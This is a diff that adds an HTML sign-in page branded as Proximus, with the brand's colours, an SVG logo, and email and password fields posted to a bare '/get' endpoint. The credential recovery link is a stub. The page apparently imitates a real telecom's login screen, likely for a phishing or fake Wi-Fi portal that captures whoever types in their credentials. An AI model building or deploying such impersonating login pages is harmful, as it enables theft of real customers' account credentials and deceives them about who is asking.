@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #EEEAF4;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #6C429C;
+}
+
+.proximus-name {
+  font-size: 42px;
+  color: #6C429C;
+  margin-left: 0px;
+}
+
+.form-container {
+  background: #DED5E9;
+  border: 1px solid #CEC0DE;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #6C429C;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #BEABD3;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #6C429C;
+  border: none;
+  color: #EEEAF4;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #5B3784;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="80.000000pt" height="80.000000pt" viewBox="0 0 225.000000 225.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,225.000000) scale(0.100000,-0.100000)"
+fill="#6C429C" stroke="none">
+<path d="M413 2066 c-137 -45 -233 -172 -233 -308 0 -209 183 -381 505 -476
+l100 -30 0 -136 0 -137 -140 -47 c-164 -55 -264 -111 -344 -192 -119 -121
+-155 -260 -98 -383 32 -71 92 -135 159 -173 47 -26 63 -29 138 -29 74 0 93 4
+143 30 143 72 259 237 327 466 17 56 32 105 35 107 5 6 265 6 270 0 3 -2 18
+-51 35 -107 51 -171 143 -331 233 -405 105 -86 236 -116 339 -76 71 26 154
+100 188 166 21 42 25 63 25 139 0 80 -4 97 -30 149 -73 145 -232 253 -480 325
+l-90 27 -3 129 c-1 72 1 135 5 141 5 6 50 23 102 38 314 89 501 267 501 475 0
+85 -38 168 -106 231 -68 62 -124 85 -214 85 -63 0 -85 -5 -141 -31 -145 -69
+-272 -252 -332 -480 l-24 -89 -44 -8 c-40 -8 -227 -2 -236 6 -2 2 -15 44 -29
+93 -53 183 -155 356 -253 429 -100 73 -218 100 -308 71z m126 -240 c65 -34
+163 -180 186 -278 6 -24 5 -26 -17 -21 -114 27 -288 159 -288 218 0 32 23 66
+55 83 26 15 31 15 64 -2z m1264 3 c33 -17 57 -51 57 -82 0 -46 -86 -128 -183
+-176 -45 -21 -93 -42 -106 -46 -22 -7 -23 -5 -17 21 25 101 128 253 191 280
+37 16 32 16 58 3z m-553 -716 l0 -108 -107 2 -108 2 -3 105 -3 106 111 0 110
+0 0 -107z m-554 -510 c-50 -105 -97 -166 -151 -194 -42 -22 -47 -23 -72 -9
+-37 21 -58 60 -49 93 15 61 124 148 238 191 79 30 83 22 34 -81z m1037 24 c70
+-45 127 -112 127 -150 0 -32 -47 -87 -75 -87 -28 0 -70 27 -112 72 -40 44
+-106 167 -119 221 l-6 28 65 -25 c36 -14 90 -40 120 -59z"/>
+</g>
+</svg>
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg"></svg>
+    <div class="proximus-name">Proximus</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in</h1>
+      <h2>Use your Proximus Account</h2></center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      
+	  <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+	  
+      <button class="submit-btn" type="submit">Continue</button>
+
+<div class="error-message"></div>
+
+    
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Proximus App if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+
+</body>
+</html>
